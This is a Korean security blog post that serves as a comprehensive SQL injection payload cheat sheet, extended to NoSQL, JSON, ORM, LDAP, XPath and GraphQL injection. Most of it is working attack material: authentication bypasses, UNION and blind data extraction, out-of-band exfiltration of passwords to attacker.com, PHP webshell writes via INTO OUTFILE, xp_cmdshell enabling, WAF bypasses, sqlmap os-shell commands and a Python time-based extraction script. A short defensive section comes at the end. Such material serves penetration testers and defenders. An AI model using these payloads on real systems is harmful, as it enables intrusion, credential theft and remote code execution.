---
layout: post
title: SQL Injection [각종 Injection 포함]
subtitle: SQL Injection 총정리
author: g3rm
categories: Web
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - WEB
  - SQLi
  - JSONInjection
  - ORM
  - Payload
sidebar:
---
## Intro

SQL Injection은 진단 입문할 때 제일 먼저 배우는 취약점인데, 막상 실전에서 만나면 생각보다 까다로운 경우가 많습니다. 요즘은 ORM과 prepared statement가 기본이라 raw SQL 주입은 줄었지만, 그만큼 **NoSQL Injection**, **JSON Injection**, **ORM Injection** 같은 변종들이 늘어났습니다.

그리고 의외로 레거시 시스템이나 관리자 페이지, 검색 기능, 정렬 파라미터(`ORDER BY`) 쪽에서는 아직도 클래식 SQLi가 살아있는 걸 자주 봅니다. 특히 **컬럼명·테이블명을 동적으로 받는 부분**은 prepared statement로도 못 막아서 거의 항상 취약합니다.

이 글에서는 DB 종류별 페이로드와 SQLi 계열 인젝션들을 정리해두려고 합니다.

## SQL Injection 종류

| 종류 | 설명 | 탐지 난이도 |
| --- | --- | --- |
| In-Band (Classic) | 응답에 결과가 그대로 보이는 경우 | 쉬움 |
| Error-Based | DB 에러 메시지에 데이터가 노출 | 쉬움 |
| Union-Based | UNION으로 다른 테이블 데이터 합쳐서 추출 | 중간 |
| Blind (Boolean) | 응답이 True/False로만 갈리는 경우 | 어려움 |
| Blind (Time-Based) | 응답에 차이가 없고 시간차로만 판단 | 어려움 |
| Out-of-Band | DNS / HTTP 콜백으로 데이터 외부 전송 | 어려움 |
| Second-Order | 저장된 데이터가 나중에 다른 쿼리에서 트리거 | 매우 어려움 |

> 🔥 진단 시에는 **Time-Based Blind**가 가장 먹히는 경우가 많습니다. WAF나 에러 핸들링이 잘 되어있어도 시간 차이는 못 숨기는 경우가 많아서, In-Band 안되면 바로 Time-Based로 넘어가는 게 효율적입니다.

## Detect & Exploit

### Detect

#### 기본 탐지 페이로드

```
# 컨텍스트 파악용 (다양한 종결자)
'
"
`
)
'))
'))) 
';--
';#

# 파라미터 동작 변경 확인
1 OR 1=1
1' OR '1'='1
1' OR '1'='1'-- -
1 AND 1=2
admin'-- -

# Numeric 컨텍스트
1+1            (응답이 2와 동일하면 의심)
1*1
1-0
```

#### Error 메시지 유발

```sql
-- 강제 에러 발생용
' AND extractvalue(1, concat(0x7e, version()))-- -
' AND 1=convert(int,(select @@version))-- -
' AND 1=cast((select version()) as int)-- -

-- DB 식별 (에러 메시지에 DB명 노출)
'+(SELECT 1/0 FROM dual)+'        # Oracle 의심
' AND BENCHMARK(1,1)-- -          # MySQL 의심
' AND pg_sleep(0)-- -             # PostgreSQL 의심
```

> ☑️ 에러 메시지가 그대로 노출되는 환경은 점점 줄어들지만, 관리자 페이지나 내부 시스템에선 아직도 자주 보입니다. 첫 진단 때 한번쯤 시도해볼 가치가 있습니다.

#### DB 핑거프린팅

```sql
-- 각 DB만의 함수로 식별
'+@@version+'           # MSSQL
'+VERSION()+'           # MySQL
'+version()+'           # PostgreSQL
'+banner FROM v$version  # Oracle
'+sqlite_version()+'    # SQLite

-- 주석 스타일 차이
--           (MySQL은 -- 뒤 공백 필수)
#            (MySQL 전용)
/* */        (모든 DB)
```

### Exploit

#### Authentication Bypass

가장 클래식한 케이스입니다.

```sql
admin' OR '1'='1'-- -
admin'-- -
admin'/*
admin' #
' OR 1=1 LIMIT 1-- -
' OR '1'='1'/*
') OR ('1'='1'-- -
admin' OR sleep(5)-- -        -- 응답 지연으로 확인
```

#### Union-Based 데이터 추출

```sql
-- 1. 컬럼 개수 파악 (ORDER BY 증가시키며)
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -        -- 에러 나는 직전이 컬럼 개수

-- 2. 출력 가능 컬럼 식별
' UNION SELECT 1,2,3-- -
' UNION SELECT 'a','b','c'-- -

-- 3. 데이터 추출
' UNION SELECT username,password,3 FROM users-- -
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -
```

#### Blind Boolean

```sql
-- True/False 응답 차이 확인
' AND 1=1-- -          (True)
' AND 1=2-- -          (False)

-- 한 글자씩 추출
' AND SUBSTRING(version(),1,1)='5'-- -
' AND ASCII(SUBSTRING(version(),1,1))>50-- -
' AND (SELECT username FROM users LIMIT 1)='admin'-- -
```

#### Blind Time-Based

```sql
-- 응답 시간으로 판단 (5초 지연)
' AND IF(1=1,SLEEP(5),0)-- -                    # MySQL
'; WAITFOR DELAY '0:0:5'-- -                    # MSSQL
' AND (SELECT pg_sleep(5))-- -                  # PostgreSQL
' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)-- -    # Oracle

-- 조건부 지연 (정보 추출 결합)
' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)-- -
'; IF (SELECT TOP 1 username FROM users)='admin' WAITFOR DELAY '0:0:5'-- -
```

> 🔥 Time-Based Blind 진단 시 네트워크 지터로 인한 오탐을 줄이려면 **임계값을 5초 이상**으로 잡고 **3회 이상 반복 검증**하는 게 정확합니다.

#### Out-of-Band (OOB)

In-Band/Time-Based가 다 막혀있을 때 마지막 카드입니다. DNS lookup이나 HTTP 요청으로 데이터를 외부 서버로 빼냅니다.

```sql
-- MySQL (Windows 전용 LOAD_FILE/UNC path)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a'))-- -

-- MSSQL
'; EXEC master..xp_dirtree '\\attacker.com\share\'-- -
'; EXEC master..xp_fileexist '\\attacker.com\file'-- -

-- Oracle (가장 유명)
' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)) FROM dual)-- -

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?d=$(whoami)';
```

```bash
# 콜백 받을 서버 (interactsh 또는 자체 DNS 서버)
interactsh-client
# → 발급된 도메인을 페이로드에 넣고 콜백 모니터링
```

> ☑️ OOB는 [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) 또는 [interactsh](https://github.com/projectdiscovery/interactsh) 가 가장 편합니다. 자체 DNS 서버 운영도 가능하지만 유지보수 귀찮습니다.

## DB 종류별 Payload

### MySQL / MariaDB

```sql
-- Version
SELECT @@version;
SELECT VERSION();

-- 현재 DB / User
SELECT DATABASE();
SELECT USER();
SELECT CURRENT_USER();

-- DB / Table / Column 나열
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE();
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users';

-- 데이터 추출
' UNION SELECT GROUP_CONCAT(username,':',password SEPARATOR '\n'),NULL FROM users-- -

-- 파일 읽기 (FILE 권한 필요)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -

-- 파일 쓰기 (웹쉘 업로드)
' UNION SELECT '<?php system($_GET[c]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'-- -

-- Time-Based
' AND SLEEP(5)-- -
' AND BENCHMARK(10000000,SHA1(1))-- -
' AND IF(1=1,SLEEP(5),0)-- -

-- 주석
-- 한줄 주석 (-- 뒤 공백 필수)
# 한줄 주석
/* 여러줄 주석 */
```

### PostgreSQL

```sql
-- Version
SELECT version();
SELECT current_setting('server_version');

-- 현재 DB / User
SELECT current_database();
SELECT current_user;

-- DB / Table / Column 나열
SELECT string_agg(datname,',') FROM pg_database;
SELECT string_agg(table_name,',') FROM information_schema.tables;
SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users';

-- 명령 실행 (슈퍼유저 권한 필요)
'; CREATE TABLE x(c text); COPY x FROM PROGRAM 'id'; SELECT * FROM x-- -

-- 파일 읽기
'; CREATE TABLE x(c text); COPY x FROM '/etc/passwd'; SELECT * FROM x-- -

-- Time-Based
'; SELECT pg_sleep(5)-- -
' AND (SELECT 1 FROM pg_sleep(5))-- -

-- OOB (DNS exfil)
' AND (SELECT * FROM dblink('host='||(SELECT password FROM users LIMIT 1)||'.attacker.com user=postgres dbname=test','SELECT 1') AS t(c text))-- -
```

### MSSQL (Microsoft SQL Server)

```sql
-- Version
SELECT @@version;

-- 현재 DB / User
SELECT DB_NAME();
SELECT SYSTEM_USER;
SELECT user_name();

-- DB / Table / Column 나열
SELECT name FROM master..sysdatabases;
SELECT name FROM sysobjects WHERE xtype='U';
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users');

-- Stacked Query 가능 (다른 DB는 거의 불가)
'; INSERT INTO users VALUES('attacker','pass')-- -

-- 명령 실행 (xp_cmdshell 활성화 필요)
'; EXEC xp_cmdshell 'whoami'-- -

-- xp_cmdshell 활성화
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -

-- Time-Based
'; WAITFOR DELAY '0:0:5'-- -
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -

-- OOB (UNC path)
'; EXEC master..xp_dirtree '\\attacker.com\share\'-- -
```

### Oracle

```sql
-- Version
SELECT banner FROM v$version;
SELECT * FROM v$version WHERE banner LIKE 'Oracle%';

-- 현재 User / DB
SELECT user FROM dual;
SELECT global_name FROM global_name;

-- DB / Table / Column 나열
SELECT table_name FROM all_tables;
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';

-- 데이터 추출 (UNION 시 FROM dual 필수)
' UNION SELECT username,password FROM users-- -

-- Error-Based (가장 강력)
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT password FROM users WHERE rownum=1))-- -
' AND extractvalue(1,(SELECT password FROM users WHERE rownum=1))-- -

-- Time-Based
' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) IS NOT NULL-- -
' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) ELSE 1 END)-- -

-- OOB (UTL_HTTP)
' AND UTL_HTTP.REQUEST('http://attacker.com/?d='||(SELECT password FROM users WHERE rownum=1))-- -

-- 주석 (-- 뒤 공백 필수)
```

### SQLite

```sql
-- Version
SELECT sqlite_version();

-- Table 나열
SELECT name FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master WHERE type='table' AND name='users';

-- Column 나열 (PRAGMA)
SELECT * FROM pragma_table_info('users');

-- 데이터 추출
' UNION SELECT username,password FROM users-- -

-- Time-Based (직접 sleep 함수 없음, randomblob 활용)
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))-- -

-- 파일 첨부 (다른 DB 파일 마운트)
'; ATTACH DATABASE '/var/www/html/shell.php' AS shell; CREATE TABLE shell.pwn(c text); INSERT INTO shell.pwn VALUES('<?php system($_GET[c]); ?>')-- -
```

### 주석 / 공백 / 종결자 차이 정리

| DB | 주석 | 문자열 결합 | 시간 지연 | 다중 쿼리 |
| --- | --- | --- | --- | --- |
| MySQL | `-- ` `#` `/**/` | `CONCAT()`, `' '` | `SLEEP()`, `BENCHMARK()` | 기본 X |
| PostgreSQL | `-- ` `/**/` | `\|\|` | `pg_sleep()` | O |
| MSSQL | `-- ` `/**/` | `+` | `WAITFOR DELAY` | O |
| Oracle | `-- ` `/**/` | `\|\|` | `DBMS_PIPE.RECEIVE_MESSAGE` | X |
| SQLite | `-- ` `/**/` | `\|\|` | `randomblob` 트릭 | X |

## WAF Bypass

### 공백 우회

```sql
-- 공백 → 다른 문자
'/**/UNION/**/SELECT/**/1,2,3-- -
'%09UNION%09SELECT%091,2,3-- -        # Tab
'%0AUNION%0ASELECT%0A1,2,3-- -        # LF
'%0DUNION%0DSELECT%0D1,2,3-- -        # CR
'%a0UNION%a0SELECT%a01,2,3-- -        # NBSP

-- 괄호로 공백 대체
'UNION(SELECT(1),(2),(3))-- -
'OR(1)=(1)-- -
```

### 키워드 우회

```sql
-- 대소문자 혼합
' UnIoN sElEcT 1,2,3-- -

-- 중복 키워드 (필터가 한번만 제거하는 경우)
' UNUNIONION SESELECTLECT 1,2,3-- -

-- HEX / CHAR 인코딩
' UNION SELECT 0x61646d696e-- -                  # 'admin'
' UNION SELECT CHAR(97,100,109,105,110)-- -

-- Inline 주석으로 키워드 분리
' UN/**/ION SE/**/LECT 1,2,3-- -
'/*!UNION*/ /*!SELECT*/ 1,2,3-- -                # MySQL 전용

-- MySQL Versioned Comment (특정 버전 이상에서만 실행)
'/*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -
```

### 따옴표 우회

```sql
-- 따옴표 없이 문자열 표현
SELECT 0x61646d696e                              # HEX
SELECT CHAR(97,100,109,105,110)                  # MySQL
SELECT CHR(97)||CHR(100)||CHR(109)               # Oracle/PgSQL

-- WHERE column='admin' 우회
WHERE column=0x61646d696e
WHERE column=CONCAT(CHAR(97),CHAR(100),CHAR(109))
```

### Logical Operator 우회

```sql
-- AND/OR 차단 시
' && 1=1-- -                  # MySQL
' || 1=1-- -                  # 대부분
' XOR 1=2-- -                 # MySQL

-- = 차단 시
' AND 1 LIKE 1-- -
' AND 1 BETWEEN 1 AND 1-- -
' AND 1 IN (1)-- -
' AND 1<2-- -
```

> ☑️ WAF 우회는 [SQLMap의 tamper script](https://github.com/sqlmapproject/sqlmap/tree/master/tamper) 가 종류별로 정리되어 있어서 진단 시 옵션으로 자동 적용해주는 게 빠릅니다.

## 자동화 - SQLMap

```bash
# 기본 사용
sqlmap -u "https://victim.com/page?id=1" --batch

# POST 요청 (Burp 요청 저장 후)
sqlmap -r request.txt --batch

# Cookie 인젝션
sqlmap -u "https://victim.com/" --cookie="id=1*" --level=3

# DBMS 강제 지정 (이미 알고 있을 때)
sqlmap -u "https://victim.com/?id=1" --dbms=mysql --batch

# WAF 우회 tamper script 적용
sqlmap -u "https://victim.com/?id=1" --tamper=space2comment,between,randomcase --batch

# 데이터베이스 / 테이블 / 데이터 추출
sqlmap -u "https://victim.com/?id=1" --dbs
sqlmap -u "https://victim.com/?id=1" -D dbname --tables
sqlmap -u "https://victim.com/?id=1" -D dbname -T users --columns
sqlmap -u "https://victim.com/?id=1" -D dbname -T users --dump

# OS Shell (가능한 경우)
sqlmap -u "https://victim.com/?id=1" --os-shell
sqlmap -u "https://victim.com/?id=1" --os-pwn        # Meterpreter

# Time-Based 강제 + 안정성 옵션
sqlmap -u "https://victim.com/?id=1" --technique=T --time-sec=10 --threads=1
```

> 🔥 SQLMap 돌리기 전에 **수동으로 한번 페이로드 넣어서 컨텍스트 파악하고 돌리는 게 정확도가 훨씬 높습니다**. 무작정 돌리면 false positive도 많고 시간도 오래 걸립니다.

## SQLi 외 유사 Injection

### NoSQL Injection (MongoDB)

MongoDB는 SQL이 아니라 JSON/BSON 기반 쿼리를 쓰는데, 인젝션 패턴은 비슷합니다.

#### Operator Injection

```javascript
// 정상 요청
{ "username": "admin", "password": "1234" }

// 페이로드: $ne (not equal) - admin 사용자로 로그인
{ "username": "admin", "password": {"$ne": null} }

// 페이로드: $gt (greater than)
{ "username": {"$gt": ""}, "password": {"$gt": ""} }

// 페이로드: $regex - 패스워드 한 글자씩 추출
{ "username": "admin", "password": {"$regex": "^a"} }
{ "username": "admin", "password": {"$regex": "^ab"} }

// 페이로드: $where - JS 코드 실행
{ "username": {"$where": "this.password.match(/^a/)"} }
{ "username": {"$where": "sleep(5000) || true"} }      // Time-Based
```

#### URL 파라미터 형태

PHP/Python의 일부 프레임워크는 `param[$ne]=` 형태로 NoSQL 연산자를 직접 받습니다.

```
# 인증 우회
POST /login
username[$ne]=null&password[$ne]=null

# Regex 기반 추출 (Blind)
username=admin&password[$regex]=^a
username=admin&password[$regex]=^ab

# Time-Based
username[$where]=sleep(5000)
```

#### MongoDB 진단 페이로드

```javascript
// 인증 우회 모음
{"username": {"$ne": "x"}, "password": {"$ne": "x"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$exists": true}, "password": {"$exists": true}}
{"username": {"$in": ["admin"]}, "password": {"$ne": null}}

// JS 코드 실행 ($where)
{"$where": "1==1"}
{"$where": "this.password=='admin'"}
{"$where": "sleep(5000)"}              // Time-Based
{"$where": "this.username.length>5"}   // Boolean Blind

// Regex로 한 글자씩 추출
{"username":"admin","password":{"$regex":"^a.*"}}
{"username":"admin","password":{"$regex":"^ad.*"}}
```

> ☑️ NoSQL 진단 시 [NoSQLMap](https://github.com/codingo/NoSQLMap) 또는 [nosqli](https://github.com/Charlie-belmer/nosqli) 자동화 도구가 유용합니다. 단, MongoDB 외 Redis/CouchDB/DynamoDB는 별도 페이로드가 필요합니다.

### JSON Injection

API 요청의 JSON 본문 자체를 조작하는 인젝션입니다. 주로 인증 / 권한 / 비즈니스 로직 우회에 활용됩니다.

#### Mass Assignment

```javascript
// 정상 회원가입 요청
POST /api/register
{"username": "test", "email": "test@x.com"}

// 페이로드: 추가 필드 주입 (서버가 모든 필드를 자동 매핑할 때)
{"username": "test", "email": "test@x.com", "role": "admin"}
{"username": "test", "email": "test@x.com", "isAdmin": true, "balance": 99999}
```

#### JSON Parameter Pollution (JPP)

```javascript
// 같은 키를 여러 번 (파서마다 처리 방식 다름)
{"role": "user", "role": "admin"}
{"username": "admin", "username": "guest"}

// 일부 파서는 첫 번째, 일부는 마지막을 채택
// → 인증 단계와 권한 검증 단계가 다른 파서 쓰면 우회 가능
```

#### Type Confusion

```javascript
// 정상
{"id": 100}

// 페이로드: 배열 / 객체로 타입 변경
{"id": [100, 101, 102]}
{"id": {"$ne": null}}              // NoSQLi와 결합
{"id": null}
{"id": true}
```

> 🔥 Mass Assignment는 Rails, Django, Spring 같은 프레임워크의 자동 바인딩 기능에서 자주 발생합니다. 회원가입 / 프로필 수정 API는 한번씩 점검해볼 가치가 있습니다.

### ORM Injection

ORM이 안전하다고 생각하지만, 동적으로 컬럼명/테이블명/정렬조건을 받으면 그대로 SQL로 들어갑니다.

#### ORDER BY Injection

```python
# 취약 코드 (Django 예시)
def get_users(request):
    sort = request.GET.get('sort', 'id')
    return User.objects.all().order_by(sort)
    
# 페이로드
?sort=id
?sort=-password           # 컬럼명 노출 시 패스워드 정렬로 한 글자씩 유추 가능
?sort=(CASE WHEN ...)     # 일부 ORM은 raw 표현식 통과
```

#### Raw Query / extra() 오용

```python
# Django - extra() / raw()
User.objects.extra(where=[f"id={user_input}"])    # 취약
User.objects.raw(f"SELECT * FROM users WHERE id={user_input}")    # 취약

# SQLAlchemy - text()
session.query(User).filter(text(f"id={user_input}"))    # 취약

# Sequelize (Node.js)
User.findAll({ where: sequelize.literal(`id = ${user_input}`) })   // 취약
```

#### Operator Injection (Sequelize)

```javascript
// Sequelize는 객체 기반 쿼리에서 연산자가 그대로 노출
// 사용자 입력을 객체째 받으면 NoSQL Injection과 비슷한 우회 가능

// 취약 코드
User.findOne({ where: { username: req.body.username, password: req.body.password } });

// 페이로드 (req.body가 그대로 들어가는 경우)
{
  "username": "admin",
  "password": { "[Op.ne]": null }
}
```

### LDAP Injection

LDAP 쿼리 인젝션도 SQLi와 비슷한 패턴입니다.

```
# 정상
(&(uid=admin)(password=1234))

# 페이로드: 인증 우회
(&(uid=admin)(password=*))
(&(uid=admin)(&))
admin)(&)

# 와일드카드로 데이터 추출
(&(uid=a*)(password=*))      # uid가 'a'로 시작하는 사용자 존재 여부
```

### XPath Injection

XML 데이터를 쿼리할 때 발생합니다.

```
# 정상
//user[username/text()='admin' and password/text()='1234']

# 페이로드
' or '1'='1
' or 1=1 or ''='
admin' or '1'='1' or 'a'='a
```

### GraphQL Injection

GraphQL은 별도 카테고리이지만 인젝션이 빈번합니다.

```graphql
# Introspection으로 스키마 노출
{ __schema { types { name fields { name } } } }

# Batched Query (Rate limit 우회)
[
  { "query": "mutation { login(user:\"admin\", pass:\"a\") { token } }" },
  { "query": "mutation { login(user:\"admin\", pass:\"b\") { token } }" }
]

# Alias 활용 brute force
query {
  a1: login(pass:"1111") { token }
  a2: login(pass:"1112") { token }
  a3: login(pass:"1113") { token }
}

# SQLi가 GraphQL resolver 안에서 발생하는 경우 (백엔드 검증 누락)
{ user(id: "1' OR '1'='1") { name } }
```

> ☑️ GraphQL은 단순 인젝션 외에도 DoS, IDOR, 권한 우회 등 별도 카테고리로 정리할 만큼 케이스가 많아서 추후 별도 포스트로 다뤄볼 예정입니다.

## PoC - Time-Based Blind 자동화

```python
# Python 3.11 / requests 2.31.0
# pip install requests==2.31.0
import requests
import string
import time
import logging
from urllib.parse import quote

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s')

TARGET = 'https://victim.example.com/api/search'
DELAY = 5
THRESHOLD = 4.5    # 임계값 (네트워크 지터 고려)
CHARSET = string.ascii_lowercase + string.digits + '_-@.'

def check_response_time(payload):
    """페이로드 주입 후 응답 시간 측정"""
    encoded = quote(payload)
    url = f"{TARGET}?q={encoded}"
    start = time.time()
    try:
        requests.get(url, timeout=DELAY + 5)
    except requests.exceptions.Timeout:
        return DELAY + 5
    return time.time() - start


def extract_string(query_template, max_len=50):
    """
    Time-Based로 문자열 한 글자씩 추출
    query_template: '{position}'을 위치, '{char}'를 비교 문자로 가진 SQL
    """
    result = ''
    logging.info(f"[+] Extraction start - max_len={max_len}")
    
    for pos in range(1, max_len + 1):
        found = False
        for char in CHARSET:
            payload = query_template.format(position=pos, char=char)
            elapsed = check_response_time(payload)
            
            if elapsed >= THRESHOLD:
                result += char
                found = True
                # 진행률 표시
                logging.info(f"[Progress] pos={pos}/{max_len} char='{char}' result='{result}'")
                break
        
        if not found:
            # 이 위치에서 매칭되는 글자 없으면 종료 (문자열 끝)
            logging.info(f"[+] End reached at position {pos}")
            break
    
    logging.info(f"[+] Final result: {result}")
    return result


if __name__ == '__main__':
    # 예시: MySQL Time-Based로 현재 DB명 추출
    template = (
        "1' AND IF(SUBSTRING(DATABASE(),{position},1)='{char}',"
        f"SLEEP({DELAY}),0)-- -"
    )
    
    logging.info("[*] Target: " + TARGET)
    logging.info("[*] Extracting current database name...")
    
    db_name = extract_string(template, max_len=30)
    print(f"\n[+] Extracted DB Name: {db_name}")
```

## Security Measures

### 1. Prepared Statement (Parameterized Query)

가장 확실한 방어입니다.

```python
# 안전 (Python / psycopg2)
cur.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# 안전 (Java / JDBC)
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userId);

# 안전 (Node.js / mysql2)
conn.execute('SELECT * FROM users WHERE id = ?', [userId]);
```

> 🔥 **단, 컬럼명 / 테이블명 / ORDER BY는 Prepared Statement로 못 막습니다**. 이런 경우는 반드시 **화이트리스트 검증**을 추가해야 합니다.

```python
# ORDER BY 안전 처리
ALLOWED_SORT = {'id', 'name', 'created_at'}
sort = request.args.get('sort', 'id')
if sort not in ALLOWED_SORT:
    sort = 'id'
query = f"SELECT * FROM users ORDER BY {sort}"
```

### 2. Input Validation

```python
# 숫자만 허용
if not user_id.isdigit():
    abort(400)

# 이메일 형식 검증
import re
if not re.match(r'^[\w.+-]+@[\w.-]+\.\w+$', email):
    abort(400)
```

### 3. 최소 권한 원칙

```sql
-- 웹 애플리케이션 전용 계정 생성
CREATE USER 'webapp'@'%' IDENTIFIED BY 'strong_pw';
GRANT SELECT, INSERT, UPDATE ON appdb.* TO 'webapp'@'%';

-- FILE / DROP / xp_cmdshell 등 위험 권한 제거
REVOKE FILE ON *.* FROM 'webapp'@'%';
```

### 4. NoSQL 환경 추가 조치

```javascript
// MongoDB - 사용자 입력에서 $ 키 제거
const sanitize = require('mongo-sanitize');
User.findOne({ username: sanitize(req.body.username) });

// 또는 객체 키 검증
function checkForOperators(obj) {
    for (const key in obj) {
        if (key.startsWith('$')) throw new Error('Operator injection detected');
    }
}

// $where 사용 자체를 비활성화 (MongoDB 설정)
// security.javascriptEnabled: false
```

### 5. ORM 사용 시 주의

```python
# Django - raw() 대신 ORM 메서드 사용
User.objects.filter(id=user_id)              # 안전
User.objects.raw(f"... {user_input}")        # 위험

# Sequelize - replacements 옵션 활용
sequelize.query('SELECT * FROM users WHERE id = :id', {
    replacements: { id: userId },             // 안전
    type: QueryTypes.SELECT
});
```

## References

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [SQLMap Tamper Scripts](https://github.com/sqlmapproject/sqlmap/tree/master/tamper)
- [NoSQLMap](https://github.com/codingo/NoSQLMap)
- [HackTricks - SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)

 


 










